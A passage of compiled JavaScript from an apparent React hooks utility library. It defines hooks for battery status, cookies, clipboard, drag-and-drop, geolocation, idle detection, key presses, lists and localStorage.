    obj.addEventListener.apply(obj, args);
  }
}
function off(obj) {
  if (obj && obj.removeEventListener) {
    for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
      args[_key2 - 1] = arguments[_key2];
    }
    obj.removeEventListener.apply(obj, args);
  }
}
var isBrowser = typeof window !== 'undefined';
var isNavigator = typeof navigator !== 'undefined';

//@ts-ignore
var nav = isNavigator ? navigator : undefined;
var isBatteryApiSupported = nav && typeof nav.getBattery === 'function';
function useBatteryMock() {
  return {
    isSupported: false
  };
}
function useBattery() {
  var _useState = React.useState({
      isSupported: true,
      fetched: false
    }),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var isMounted = true;
    var battery = null;
    var handleChange = function handleChange() {
      if (!isMounted || !battery) {
        return;
      }
      var newState = {
        isSupported: true,
        fetched: true,
        level: battery.level,
        charging: battery.charging,
        dischargingTime: battery.dischargingTime,
        chargingTime: battery.chargingTime
      };
      !isDeepEqualReact(state, newState) && setState(newState);
    };
    nav.getBattery().then(function (bat) {
      if (!isMounted) {
        return;
      }
      battery = bat;
      on(battery, 'chargingchange', handleChange);
      on(battery, 'chargingtimechange', handleChange);
      on(battery, 'dischargingtimechange', handleChange);
      on(battery, 'levelchange', handleChange);
      handleChange();
    });
    return function () {
      isMounted = false;
      if (battery) {
        off(battery, 'chargingchange', handleChange);
        off(battery, 'chargingtimechange', handleChange);
        off(battery, 'dischargingtimechange', handleChange);
        off(battery, 'levelchange', handleChange);
      }
    };
  }, []);
  return state;
}
var useBattery$1 = isBatteryApiSupported ? useBattery : useBatteryMock;

//@ts-ignore
var useBeforeUnload = function useBeforeUnload(enabled, message) {
  if (enabled === void 0) {
    enabled = true;
  }
  var handler = React.useCallback(function (event) {
    var finalEnabled = typeof enabled === 'function' ? enabled() : true;
    if (!finalEnabled) {
      return;
    }
    event.preventDefault();
    if (message) {
      event.returnValue = message;
    }
    return message;
  }, [enabled, message]);
  React.useEffect(function () {
    if (!enabled) {
      return;
    }
    on(window, 'beforeunload', handler);
    return function () {
      return off(window, 'beforeunload', handler);
    };
  }, [enabled, handler]);
};

//@ts-ignore
var toggleReducer = function toggleReducer(state, nextValue) {
  return typeof nextValue === 'boolean' ? nextValue : !state;
};
var useToggle = function useToggle(initialValue) {
  return React.useReducer(toggleReducer, initialValue);
};

//@ts-ignore

var defaultEvents = ['mousedown', 'touchstart'];
var useClickAway = function useClickAway(ref, onClickAway, events) {
  if (events === void 0) {
    events = defaultEvents;
  }
  var savedCallback = React.useRef(onClickAway);
  React.useEffect(function () {
    savedCallback.current = onClickAway;
  }, [onClickAway]);
  React.useEffect(function () {
    var handler = function handler(event) {
      var el = ref.current;
      el && !el.contains(event.target) && savedCallback.current(event);
    };
    for (var _iterator = _createForOfIteratorHelperLoose(events), _step; !(_step = _iterator()).done;) {
      var eventName = _step.value;
      on(document, eventName, handler);
    }
    return function () {
      for (var _iterator2 = _createForOfIteratorHelperLoose(events), _step2; !(_step2 = _iterator2()).done;) {
        var eventName = _step2.value;
        off(document, eventName, handler);
      }
    };
  }, [events, ref]);
};

//@ts-ignore
var useCookie = function useCookie(cookieName) {
  var _useState = React.useState(function () {
      return Cookies.get(cookieName) || null;
    }),
    value = _useState[0],
    setValue = _useState[1];
  var updateCookie = React.useCallback(function (newValue, options) {
    Cookies.set(cookieName, newValue, options);
    setValue(newValue);
  }, [cookieName]);
  var deleteCookie = React.useCallback(function () {
    Cookies.remove(cookieName);
    setValue(null);
  }, [cookieName]);
  return [value, updateCookie, deleteCookie];
};

//@ts-ignore
var useCopyToClipboard = function useCopyToClipboard() {
  var isMounted = useMountedState();
  var _useSetState = useSetState({
      value: undefined,
      error: undefined,
      noUserInteraction: true
    }),
    state = _useSetState[0],
    setState = _useSetState[1];
  var copyToClipboard = React.useCallback(function (value) {
    if (!isMounted()) {
      return;
    }
    var noUserInteraction;
    var normalizedValue;
    try {
      // only strings and numbers casted to strings can be copied to clipboard
      if (typeof value !== 'string' && typeof value !== 'number') {
        var error = new Error("Cannot copy typeof " + typeof value + " to clipboard, must be a string");
        if ("development" === 'development') console.error(error);
        setState({
          value: value,
          error: error,
          noUserInteraction: true
        });
        return;
      }
      // empty strings are also considered invalid
      else if (value === '') {
        var _error = new Error("Cannot copy empty string to clipboard.");
        if ("development" === 'development') console.error(_error);
        setState({
          value: value,
          error: _error,
          noUserInteraction: true
        });
        return;
      }
      normalizedValue = value.toString();
      noUserInteraction = writeText(normalizedValue);
      setState({
        value: normalizedValue,
        error: undefined,
        noUserInteraction: noUserInteraction
      });
    } catch (error) {
      setState({
        value: normalizedValue,
        error: error,
        noUserInteraction: noUserInteraction
      });
    }
  }, []);
  return [state, copyToClipboard];
};

//@ts-ignore
var updateReducer = function updateReducer(num) {
  return (num + 1) % 1000000;
};
function useUpdate() {
  var _useReducer = React.useReducer(updateReducer, 0),
    update = _useReducer[1];
  return update;
}

function resolveHookState(nextState, currentState) {
  if (typeof nextState === 'function') {
    return nextState.length ? nextState(currentState) : nextState();
  }
  return nextState;
}

//@ts-ignore
function useGetSet(initialState) {
  var state = React.useRef(resolveHookState(initialState));
  var update = useUpdate();
  return React.useMemo(function () {
    return [function () {
      return state.current;
    }, function (newState) {
      state.current = resolveHookState(newState, state.current);
      update();
    }];
  }, []);
}

//@ts-ignore
function useCounter(initialValue, max, min) {
  if (initialValue === void 0) {
    initialValue = 0;
  }
  if (max === void 0) {
    max = null;
  }
  if (min === void 0) {
    min = null;
  }
  var init = resolveHookState(initialValue);
  typeof init !== 'number' && console.error('initialValue has to be a number, got ' + typeof initialValue);
  if (typeof min === 'number') {
    init = Math.max(init, min);
  } else if (min !== null) {
    console.error('min has to be a number, got ' + typeof min);
  }
  if (typeof max === 'number') {
    init = Math.min(init, max);
  } else if (max !== null) {
    console.error('max has to be a number, got ' + typeof max);
  }
  var _useGetSet = useGetSet(init),
    get = _useGetSet[0],
    setInternal = _useGetSet[1];
  return [get(), React.useMemo(function () {
    var set = function set(newState) {
      var prevState = get();
      var rState = resolveHookState(newState, prevState);
      if (prevState !== rState) {
        if (typeof min === 'number') {
          rState = Math.max(rState, min);
        }
        if (typeof max === 'number') {
          rState = Math.min(rState, max);
        }
        prevState !== rState && setInternal(rState);
      }
    };
    return {
      get: get,
      set: set,
      inc: function inc(delta) {
        if (delta === void 0) {
          delta = 1;
        }
        var rDelta = resolveHookState(delta, get());
        if (typeof rDelta !== 'number') {
          console.error('delta has to be a number or function returning a number, got ' + typeof rDelta);
        }
        set(function (num) {
          return num + rDelta;
        });
      },
      dec: function dec(delta) {
        if (delta === void 0) {
          delta = 1;
        }
        var rDelta = resolveHookState(delta, get());
        if (typeof rDelta !== 'number') {
          console.error('delta has to be a number or function returning a number, got ' + typeof rDelta);
        }
        set(function (num) {
          return num - rDelta;
        });
      },
      reset: function reset(value) {
        if (value === void 0) {
          value = init;
        }
        var rValue = resolveHookState(value, get());
        if (typeof rValue !== 'number') {
          console.error('value has to be a number or function returning a number, got ' + typeof rValue);
        }
        // eslint-disable-next-line react-hooks/exhaustive-deps
        init = rValue;
        set(rValue);
      }
    };
  }, [init, min, max])];
}

//@ts-ignore
var useIsomorphicLayoutEffect = isBrowser ? React.useLayoutEffect : React.useEffect;

//@ts-ignore
var nano = /*#__PURE__*/nanoCss.create();
cssom.addon(nano);
vcssom.addon(nano);
var counter = 0;
var useCss = function useCss(css) {
  var className = React.useMemo(function () {
    return 'react-use-css-' + (counter++).toString(36);
  }, []);
  var sheet = React.useMemo(function () {
    return new nano.VSheet();
  }, []);
  useIsomorphicLayoutEffect(function () {
    var tree = {};
    cssToTree.cssToTree(tree, css, '.' + className, '');
    sheet.diff(tree);
    return function () {
      sheet.diff({});
    };
  });
  return className;
};

//@ts-ignore
var isPrimitive = function isPrimitive(val) {
  return val !== Object(val);
};
var useCustomCompareEffect = function useCustomCompareEffect(effect, deps, depsEqual) {
  {
    if (!(deps instanceof Array) || !deps.length) {
      console.warn('`useCustomCompareEffect` should not be used with no dependencies. Use React.useEffect instead.');
    }
    if (deps.every(isPrimitive)) {
      console.warn('`useCustomCompareEffect` should not be used with dependencies that are all primitive values. Use React.useEffect instead.');
    }
    if (typeof depsEqual !== 'function') {
      console.warn('`useCustomCompareEffect` should be used with depsEqual callback for comparing deps list');
    }
  }
  var ref = React.useRef(undefined);
  if (!ref.current || !depsEqual(deps, ref.current)) {
    ref.current = deps;
  }
  React.useEffect(effect, ref.current);
};

//@ts-ignore
function useTimeoutFn(fn, ms) {
  if (ms === void 0) {
    ms = 0;
  }
  var ready = React.useRef(false);
  var timeout = React.useRef();
  var callback = React.useRef(fn);
  var isReady = React.useCallback(function () {
    return ready.current;
  }, []);
  var set = React.useCallback(function () {
    ready.current = false;
    timeout.current && clearTimeout(timeout.current);
    timeout.current = setTimeout(function () {
      ready.current = true;
      callback.current();
    }, ms);
  }, [ms]);
  var clear = React.useCallback(function () {
    ready.current = null;
    timeout.current && clearTimeout(timeout.current);
  }, []);
  // update ref when function changes
  React.useEffect(function () {
    callback.current = fn;
  }, [fn]);
  // set on mount, clear on unmount
  React.useEffect(function () {
    set();
    return clear;
  }, [ms]);
  return [isReady, clear, set];
}

//@ts-ignore
function useDebounce(fn, ms, deps) {
  if (ms === void 0) {
    ms = 0;
  }
  if (deps === void 0) {
    deps = [];
  }
  var _useTimeoutFn = useTimeoutFn(fn, ms),
    isReady = _useTimeoutFn[0],
    cancel = _useTimeoutFn[1],
    reset = _useTimeoutFn[2];
  React.useEffect(reset, deps);
  return [isReady, cancel];
}

var isPrimitive$1 = function isPrimitive(val) {
  return val !== Object(val);
};
var useDeepCompareEffect = function useDeepCompareEffect(effect, deps) {
  {
    if (!(deps instanceof Array) || !deps.length) {
      console.warn('`useDeepCompareEffect` should not be used with no dependencies. Use React.useEffect instead.');
    }
    if (deps.every(isPrimitive$1)) {
      console.warn('`useDeepCompareEffect` should not be used with dependencies that are all primitive values. Use React.useEffect instead.');
    }
  }
  useCustomCompareEffect(effect, deps, isDeepEqualReact);
};

//@ts-ignore
var useDefault = function useDefault(defaultValue, initialValue) {
  var _useState = React.useState(initialValue),
    value = _useState[0],
    setValue = _useState[1];
  if (value === undefined || value === null) {
    return [defaultValue, setValue];
  }
  return [value, setValue];
};

//@ts-ignore
var createProcess = function createProcess(options) {
  return function (dataTransfer, event) {
    var uri = dataTransfer.getData('text/uri-list');
    if (uri) {
      (options.onUri || noop)(uri, event);
      return;
    }
    if (dataTransfer.files && dataTransfer.files.length) {
      (options.onFiles || noop)(Array.from(dataTransfer.files), event);
      return;
    }
    if (event.clipboardData) {
      var text = event.clipboardData.getData('text');
      (options.onText || noop)(text, event);
      return;
    }
  };
};
var useDrop = function useDrop(options, args) {
  if (options === void 0) {
    options = {};
  }
  if (args === void 0) {
    args = [];
  }
  var _options = options,
    onFiles = _options.onFiles,
    onText = _options.onText,
    onUri = _options.onUri;
  var _useState = React.useState(false),
    over = _useState[0],
    setOverRaw = _useState[1];
  var setOver = React.useCallback(setOverRaw, []);
  var process = React.useMemo(function () {
    return createProcess(options);
  }, [onFiles, onText, onUri]);
  React.useEffect(function () {
    var onDragOver = function onDragOver(event) {
      event.preventDefault();
      setOver(true);
    };
    var onDragEnter = function onDragEnter(event) {
      event.preventDefault();
      setOver(true);
    };
    var onDragLeave = function onDragLeave() {
      setOver(false);
    };
    var onDragExit = function onDragExit() {
      setOver(false);
    };
    var onDrop = function onDrop(event) {
      event.preventDefault();
      setOver(false);
      process(event.dataTransfer, event);
    };
    var onPaste = function onPaste(event) {
      process(event.clipboardData, event);
    };
    on(document, 'dragover', onDragOver);
    on(document, 'dragenter', onDragEnter);
    on(document, 'dragleave', onDragLeave);
    on(document, 'dragexit', onDragExit);
    on(document, 'drop', onDrop);
    if (onText) {
      on(document, 'paste', onPaste);
    }
    return function () {
      off(document, 'dragover', onDragOver);
      off(document, 'dragenter', onDragEnter);
      off(document, 'dragleave', onDragLeave);
      off(document, 'dragexit', onDragExit);
      off(document, 'drop', onDrop);
      off(document, 'paste', onPaste);
    };
  }, [process].concat(args));
  return {
    over: over
  };
};

//@ts-ignore
/*
const defaultState: DropAreaState = {
  over: false,
};
*/
var createProcess$1 = function createProcess(options, mounted) {
  return function (dataTransfer, event) {
    var uri = dataTransfer.getData('text/uri-list');
    if (uri) {
      (options.onUri || noop)(uri, event);
      return;
    }
    if (dataTransfer.files && dataTransfer.files.length) {
      (options.onFiles || noop)(Array.from(dataTransfer.files), event);
      return;
    }
    if (dataTransfer.items && dataTransfer.items.length) {
      dataTransfer.items[0].getAsString(function (text) {
        if (mounted) {
          (options.onText || noop)(text, event);
        }
      });
    }
  };
};
var createBond = function createBond(process, setOver) {
  return {
    onDragOver: function onDragOver(event) {
      event.preventDefault();
    },
    onDragEnter: function onDragEnter(event) {
      event.preventDefault();
      setOver(true);
    },
    onDragLeave: function onDragLeave() {
      setOver(false);
    },
    onDrop: function onDrop(event) {
      event.preventDefault();
      event.persist();
      setOver(false);
      process(event.dataTransfer, event);
    },
    onPaste: function onPaste(event) {
      event.persist();
      process(event.clipboardData, event);
    }
  };
};
var useDropArea = function useDropArea(options) {
  if (options === void 0) {
    options = {};
  }
  var _options = options,
    onFiles = _options.onFiles,
    onText = _options.onText,
    onUri = _options.onUri;
  var isMounted = useMountedState();
  var _useState = React.useState(false),
    over = _useState[0],
    setOver = _useState[1];
  var process = React.useMemo(function () {
    return createProcess$1(options, isMounted());
  }, [onFiles, onText, onUri]);
  var bond = React.useMemo(function () {
    return createBond(process, setOver);
  }, [process, setOver]);
  return [bond, {
    over: over
  }];
};

//@ts-ignore
var useEffectOnce = function useEffectOnce(effect) {
  React.useEffect(effect, []);
};

//@ts-ignore
function useEnsuredForwardedRef(forwardedRef) {
  var ensuredRef = React.useRef(forwardedRef && forwardedRef.current);
  React.useEffect(function () {
    if (!forwardedRef) {
      return;
    }
    forwardedRef.current = ensuredRef.current;
  }, [forwardedRef]);
  return ensuredRef;
}
function ensuredForwardRef(Component) {
  return React.forwardRef(function (props, ref) {
    var ensuredRef = useEnsuredForwardedRef(ref);
    return Component(props, ensuredRef);
  });
}

//@ts-ignore
var defaultTarget = isBrowser ? window : null;
var isListenerType1 = function isListenerType1(target) {
  return !!target.addEventListener;
};
var isListenerType2 = function isListenerType2(target) {
  return !!target.on;
};
var useEvent = function useEvent(name, handler, target, options) {
  if (target === void 0) {
    target = defaultTarget;
  }
  React.useEffect(function () {
    if (!handler) {
      return;
    }
    if (!target) {
      return;
    }
    if (isListenerType1(target)) {
      on(target, name, handler, options);
    } else if (isListenerType2(target)) {
      target.on(name, handler, options);
    }
    return function () {
      if (isListenerType1(target)) {
        off(target, name, handler, options);
      } else if (isListenerType2(target)) {
        target.off(name, handler, options);
      }
    };
  }, [name, handler, target, JSON.stringify(options)]);
};

//@ts-ignore
var useError = function useError() {
  var _useState = React.useState(null),
    error = _useState[0],
    setError = _useState[1];
  React.useEffect(function () {
    if (error) {
      throw error;
    }
  }, [error]);
  var dispatchError = React.useCallback(function (err) {
    setError(err);
  }, []);
  return dispatchError;
};

//@ts-ignore
var useFavicon = function useFavicon(href) {
  React.useEffect(function () {
    var link = document.querySelector("link[rel*='icon']") || document.createElement('link');
    link.type = 'image/x-icon';
    link.rel = 'shortcut icon';
    link.href = href;
    document.getElementsByTagName('head')[0].appendChild(link);
  }, [href]);
};

//@ts-ignore
var useFullscreen = function useFullscreen(ref, enabled, options) {
  if (options === void 0) {
    options = {};
  }
  var _options = options,
    video = _options.video,
    _options$onClose = _options.onClose,
    onClose = _options$onClose === void 0 ? noop : _options$onClose;
  var _useState = React.useState(enabled),
    isFullscreen = _useState[0],
    setIsFullscreen = _useState[1];
  useIsomorphicLayoutEffect(function () {
    if (!enabled) {
      return;
    }
    if (!ref.current) {
      return;
    }
    var onWebkitEndFullscreen = function onWebkitEndFullscreen() {
      if (video != null && video.current) {
        off(video.current, 'webkitendfullscreen', onWebkitEndFullscreen);
      }
      onClose();
    };
    var onChange = function onChange() {
      if (screenfull.isEnabled) {
        var isScreenfullFullscreen = screenfull.isFullscreen;
        setIsFullscreen(isScreenfullFullscreen);
        if (!isScreenfullFullscreen) {
          onClose();
        }
      }
    };
    if (screenfull.isEnabled) {
      try {
        screenfull.request(ref.current);
        setIsFullscreen(true);
      } catch (error) {
        onClose(error);
        setIsFullscreen(false);
      }
      screenfull.on('change', onChange);
    } else if (video && video.current && video.current.webkitEnterFullscreen) {
      video.current.webkitEnterFullscreen();
      on(video.current, 'webkitendfullscreen', onWebkitEndFullscreen);
      setIsFullscreen(true);
    } else {
      onClose();
      setIsFullscreen(false);
    }
    return function () {
      setIsFullscreen(false);
      if (screenfull.isEnabled) {
        try {
          screenfull.off('change', onChange);
          screenfull.exit();
        } catch (_unused) {}
      } else if (video && video.current && video.current.webkitExitFullscreen) {
        off(video.current, 'webkitendfullscreen', onWebkitEndFullscreen);
        video.current.webkitExitFullscreen();
      }
    };
  }, [enabled, video, ref]);
  return isFullscreen;
};

var useGeolocation = function useGeolocation(options) {
  var _useState = React.useState({
      loading: true,
      accuracy: null,
      altitude: null,
      altitudeAccuracy: null,
      heading: null,
      latitude: null,
      longitude: null,
      speed: null,
      timestamp: Date.now()
    }),
    state = _useState[0],
    setState = _useState[1];
  var mounted = true;
  var watchId;
  var onEvent = function onEvent(event) {
    if (mounted) {
      setState({
        loading: false,
        accuracy: event.coords.accuracy,
        altitude: event.coords.altitude,
        altitudeAccuracy: event.coords.altitudeAccuracy,
        heading: event.coords.heading,
        latitude: event.coords.latitude,
        longitude: event.coords.longitude,
        speed: event.coords.speed,
        timestamp: event.timestamp
      });
    }
  };
  var onEventError = function onEventError(error) {
    return mounted && setState(function (oldState) {
      return _extends({}, oldState, {
        loading: false,
        error: error
      });
    });
  };
  React.useEffect(function () {
    navigator.geolocation.getCurrentPosition(onEvent, onEventError, options);
    watchId = navigator.geolocation.watchPosition(onEvent, onEventError, options);
    return function () {
      mounted = false;
      navigator.geolocation.clearWatch(watchId);
    };
  }, []);
  return state;
};

var useGetSetState = function useGetSetState(initialState) {
  if (initialState === void 0) {
    initialState = {};
  }
  {
    if (typeof initialState !== 'object') {
      console.error('useGetSetState initial state must be an object.');
    }
  }
  var update = useUpdate();
  var state = React.useRef(_extends({}, initialState));
  var get = React.useCallback(function () {
    return state.current;
  }, []);
  var set = React.useCallback(function (patch) {
    if (!patch) {
      return;
    }
    {
      if (typeof patch !== 'object') {
        console.error('useGetSetState setter patch must be an object.');
      }
    }
    Object.assign(state.current, patch);
    update();
  }, []);
  return [get, set];
};

//@ts-ignore
var useHarmonicIntervalFn = function useHarmonicIntervalFn(fn, delay) {
  if (delay === void 0) {
    delay = 0;
  }
  var latestCallback = React.useRef(function () {});
  React.useEffect(function () {
    latestCallback.current = fn;
  });
  React.useEffect(function () {
    if (delay !== null) {
      var interval = setHarmonicInterval.setHarmonicInterval(function () {
        return latestCallback.current();
      }, delay);
      return function () {
        return setHarmonicInterval.clearHarmonicInterval(interval);
      };
    }
    return undefined;
  }, [delay]);
};

//@ts-ignore
var useState = React.useState;
var useHover = function useHover(element) {
  var _useState = useState(false),
    state = _useState[0],
    setState = _useState[1];
  var onMouseEnter = function onMouseEnter(originalOnMouseEnter) {
    return function (event) {
      (originalOnMouseEnter || noop)(event);
      setState(true);
    };
  };
  var onMouseLeave = function onMouseLeave(originalOnMouseLeave) {
    return function (event) {
      (originalOnMouseLeave || noop)(event);
      setState(false);
    };
  };
  if (typeof element === 'function') {
    element = element(state);
  }
  var el = React.cloneElement(element, {
    onMouseEnter: onMouseEnter(element.props.onMouseEnter),
    onMouseLeave: onMouseLeave(element.props.onMouseLeave)
  });
  return [el, state];
};

//@ts-ignore
// kudos: https://usehooks.com/
var useHoverDirty = function useHoverDirty(ref, enabled) {
  if (enabled === void 0) {
    enabled = true;
  }
  {
    if (typeof ref !== 'object' || typeof ref.current === 'undefined') {
      console.error('useHoverDirty expects a single ref argument.');
    }
  }
  var _useState = React.useState(false),
    value = _useState[0],
    setValue = _useState[1];
  React.useEffect(function () {
    var onMouseOver = function onMouseOver() {
      return setValue(true);
    };
    var onMouseOut = function onMouseOut() {
      return setValue(false);
    };
    if (enabled && ref && ref.current) {
      on(ref.current, 'mouseover', onMouseOver);
      on(ref.current, 'mouseout', onMouseOut);
    }
    // fixes react-hooks/exhaustive-deps warning about stale ref elements
    var current = ref.current;
    return function () {
      if (enabled && current) {
        off(current, 'mouseover', onMouseOver);
        off(current, 'mouseout', onMouseOut);
      }
    };
  }, [enabled, ref]);
  return value;
};

//@ts-ignore
var defaultEvents$1 = ['mousemove', 'mousedown', 'resize', 'keydown', 'touchstart', 'wheel'];
var oneMinute = 60e3;
var useIdle = function useIdle(ms, initialState, events) {
  if (ms === void 0) {
    ms = oneMinute;
  }
  if (initialState === void 0) {
    initialState = false;
  }
  if (events === void 0) {
    events = defaultEvents$1;
  }
  var _useState = React.useState(initialState),
    state = _useState[0],
    setState = _useState[1];
  React.useEffect(function () {
    var mounted = true;
    var timeout;
    var localState = state;
    var set = function set(newState) {
      if (mounted) {
        localState = newState;
        setState(newState);
      }
    };
    var onEvent = throttleDebounce.throttle(50, function () {
      if (localState) {
        set(false);
      }
      clearTimeout(timeout);
      timeout = setTimeout(function () {
        return set(true);
      }, ms);
    });
    var onVisibility = function onVisibility() {
      if (!document.hidden) {
        onEvent();
      }
    };
    for (var i = 0; i < events.length; i++) {
      on(window, events[i], onEvent);
    }
    on(document, 'visibilitychange', onVisibility);
    timeout = setTimeout(function () {
      return set(true);
    }, ms);
    return function () {
      mounted = false;
      for (var _i = 0; _i < events.length; _i++) {
        off(window, events[_i], onEvent);
      }
      off(document, 'visibilitychange', onVisibility);
    };
  }, [ms, events]);
  return state;
};

//@ts-ignore
var useIntersection = function useIntersection(ref, options) {
  var _useState = React.useState(null),
    intersectionObserverEntry = _useState[0],
    setIntersectionObserverEntry = _useState[1];
  React.useEffect(function () {
    if (ref.current && typeof IntersectionObserver === 'function') {
      var handler = function handler(entries) {
        setIntersectionObserverEntry(entries[0]);
      };
      var observer = new IntersectionObserver(handler, options);
      observer.observe(ref.current);
      return function () {
        setIntersectionObserverEntry(null);
        observer.disconnect();
      };
    }
    return function () {};
  }, [ref.current, options.threshold, options.root, options.rootMargin]);
  return intersectionObserverEntry;
};

//@ts-ignore
var useInterval = function useInterval(callback, delay) {
  var savedCallback = React.useRef(function () {});
  React.useEffect(function () {
    savedCallback.current = callback;
  });
  React.useEffect(function () {
    if (delay !== null) {
      var interval = setInterval(function () {
        return savedCallback.current();
      }, delay || 0);
      return function () {
        return clearInterval(interval);
      };
    }
    return undefined;
  }, [delay]);
};

//@ts-ignore
var createKeyPredicate = function createKeyPredicate(keyFilter) {
  return typeof keyFilter === 'function' ? keyFilter : typeof keyFilter === 'string' ? function (event) {
    return event.key === keyFilter;
  } : keyFilter ? function () {
    return true;
  } : function () {
    return false;
  };
};
var useKey = function useKey(key, fn, opts, deps) {
  if (fn === void 0) {
    fn = noop;
  }
  if (opts === void 0) {
    opts = {};
  }
  if (deps === void 0) {
    deps = [key];
  }
  var _opts = opts,
    _opts$event = _opts.event,
    event = _opts$event === void 0 ? 'keydown' : _opts$event,
    target = _opts.target,
    options = _opts.options;
  var useMemoHandler = React.useMemo(function () {
    var predicate = createKeyPredicate(key);
    var handler = function handler(handlerEvent) {
      if (predicate(handlerEvent)) {
        return fn(handlerEvent);
      }
    };
    return handler;
  }, deps);
  useEvent(event, useMemoHandler, target, options);
};

var createBreakpoint = function createBreakpoint(breakpoints) {
  if (breakpoints === void 0) {
    breakpoints = {
      laptopL: 1440,
      laptop: 1024,
      tablet: 768
    };
  }
  return function () {
    var _useState = React.useState(isBrowser ? window.innerWidth : 0),
      screen = _useState[0],
      setScreen = _useState[1];
    React.useEffect(function () {
      var setSideScreen = function setSideScreen() {
        setScreen(window.innerWidth);
      };
      setSideScreen();
      on(window, 'resize', setSideScreen);
      return function () {
        off(window, 'resize', setSideScreen);
      };
    });
    var sortedBreakpoints = React.useMemo(function () {
      return Object.entries(breakpoints).sort(function (a, b) {
        return a[1] >= b[1] ? 1 : -1;
      });
    }, [breakpoints]);
    var result = sortedBreakpoints.reduce(function (acc, _ref) {
      var name = _ref[0],
        width = _ref[1];
      if (screen >= width) {
        return name;
      } else {
        return acc;
      }
    }, sortedBreakpoints[0][0]);
    return result;
  };
};

//@ts-ignore
var useKeyPress = function useKeyPress(keyFilter) {
  var _useState = React.useState([false, null]),
    state = _useState[0],
    set = _useState[1];
  useKey(keyFilter, function (event) {
    return set([true, event]);
  }, {
    event: 'keydown'
  }, [state]);
  useKey(keyFilter, function (event) {
    return set([false, event]);
  }, {
    event: 'keyup'
  }, [state]);
  return state;
};

var useKeyPressEvent = function useKeyPressEvent(key, keydown, keyup, useKeyPress$1) {
  if (useKeyPress$1 === void 0) {
    useKeyPress$1 = useKeyPress;
  }
  var _useKeyPress = useKeyPress$1(key),
    pressed = _useKeyPress[0],
    event = _useKeyPress[1];
  useUpdateEffect(function () {
    if (!pressed && keyup) {
      keyup(event);
    } else if (pressed && keydown) {
      keydown(event);
    }
  }, [pressed]);
};

//@ts-ignore
var useLatest = function useLatest(value) {
  var ref = React.useRef(value);
  ref.current = value;
  return ref;
};

//@ts-ignore
var useLifecycles = function useLifecycles(mount, unmount) {
  React.useEffect(function () {
    if (mount) {
      mount();
    }
    return function () {
      if (unmount) {
        unmount();
      }
    };
  }, []);
};

//@ts-ignore
function useList(initialList) {
  if (initialList === void 0) {
    initialList = [];
  }
  var list = React.useRef(resolveHookState(initialList));
  var update = useUpdate();
  var actions = React.useMemo(function () {
    var a = {
      set: function set(newList) {
        list.current = resolveHookState(newList, list.current);
        update();
      },
      push: function push() {
        for (var _len = arguments.length, items = new Array(_len), _key = 0; _key < _len; _key++) {
          items[_key] = arguments[_key];
        }
        items.length && actions.set(function (curr) {
          return curr.concat(items);
        });
      },
      updateAt: function updateAt(index, item) {
        actions.set(function (curr) {
          var arr = curr.slice();
          arr[index] = item;
          return arr;
        });
      },
      insertAt: function insertAt(index, item) {
        actions.set(function (curr) {
          var arr = curr.slice();
          index > arr.length ? arr[index] = item : arr.splice(index, 0, item);
          return arr;
        });
      },
      update: function update(predicate, newItem) {
        actions.set(function (curr) {
          return curr.map(function (item) {
            return predicate(item, newItem) ? newItem : item;
          });
        });
      },
      updateFirst: function updateFirst(predicate, newItem) {
        var index = list.current.findIndex(function (item) {
          return predicate(item, newItem);
        });
        index >= 0 && actions.updateAt(index, newItem);
      },
      upsert: function upsert(predicate, newItem) {
        var index = list.current.findIndex(function (item) {
          return predicate(item, newItem);
        });
        index >= 0 ? actions.updateAt(index, newItem) : actions.push(newItem);
      },
      sort: function sort(compareFn) {
        actions.set(function (curr) {
          return curr.slice().sort(compareFn);
        });
      },
      filter: function filter(callbackFn, thisArg) {
        actions.set(function (curr) {
          return curr.slice().filter(callbackFn, thisArg);
        });
      },
      removeAt: function removeAt(index) {
        actions.set(function (curr) {
          var arr = curr.slice();
          arr.splice(index, 1);
          return arr;
        });
      },
      clear: function clear() {
        actions.set([]);
      },
      reset: function reset() {
        actions.set(resolveHookState(initialList).slice());
      }
    };
    /**
     * @deprecated Use removeAt method instead
     */
    a.remove = a.removeAt;
    return a;
  }, []);
  return [list.current, actions];
}

//@ts-ignore
var useLocalStorage = function useLocalStorage(key, initialValue, options) {
  if (!isBrowser) {
    return [initialValue, noop, noop];
  }
  if (!key) {
    throw new Error('useLocalStorage key may not be falsy');
  }
  var deserializer = options ? options.raw ? function (value) {
    return value;
  } : options.deserializer : JSON.parse;
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var initializer = React.useRef(function (key) {
    try {
      var serializer = options ? options.raw ? String : options.serializer : JSON.stringify;
      var localStorageValue = localStorage.getItem(key);
      if (localStorageValue !== null) {
        return deserializer(localStorageValue);
      } else {
        initialValue && localStorage.setItem(key, serializer(initialValue));
        return initialValue;
      }
    } catch (_unused) {
      // If user is in private mode or has storage restriction
      // localStorage can throw. JSON.parse and JSON.stringify
      // can throw, too.
      return initialValue;
    }
  });
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var _useState = React.useState(function () {
      return initializer.current(key);
    }),
    state = _useState[0],
    setState = _useState[1];
  // eslint-disable-next-line react-hooks/rules-of-hooks
  React.useLayoutEffect(function () {
    return setState(initializer.current(key));
  }, [key]);
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var set = React.useCallback(function (valOrFunc) {
    try {
      var newState = typeof valOrFunc === 'function' ? valOrFunc(state) : valOrFunc;
      if (typeof newState === 'undefined') return;
      var value;
      if (options) {
        if (options.raw) {
          if (typeof newState === 'string') value = newState;else value = JSON.stringify(newState);
        } else if (options.serializer) value = options.serializer(newState);else value = JSON.stringify(newState);
      } else value = JSON.stringify(newState);
      localStorage.setItem(key, value);
      setState(deserializer(value));
    } catch (_unused2) {
      // If user is in private mode or has storage restriction
      // localStorage can throw. Also JSON.stringify can throw.
    }
  }, [key, setState]);
  // eslint-disable-next-line react-hooks/rules-of-hooks
  var remove = React.useCallback(function () {
    try {
      localStorage.removeItem(key);
      setState(undefined);
    } catch (_unused3) {
      // If user is in private mode or has storage restriction
      // localStorage can throw.
    }
  }, [key, setState]);
  return [state, set, remove];
};

//@ts-ignore
var patchHistoryMethod = function patchHistoryMethod(method) {
  var history = window.history;
  var original = history[method];
  history[method] = function (state) {
    var result = original.apply(this, arguments);
    var event = new Event(method.toLowerCase());
    event.state = state;
    window.dispatchEvent(event);
    return result;
  };
};
if (isBrowser) {
  patchHistoryMethod('pushState');
  patchHistoryMethod('replaceState');
}
var useLocationServer = function useLocationServer() {
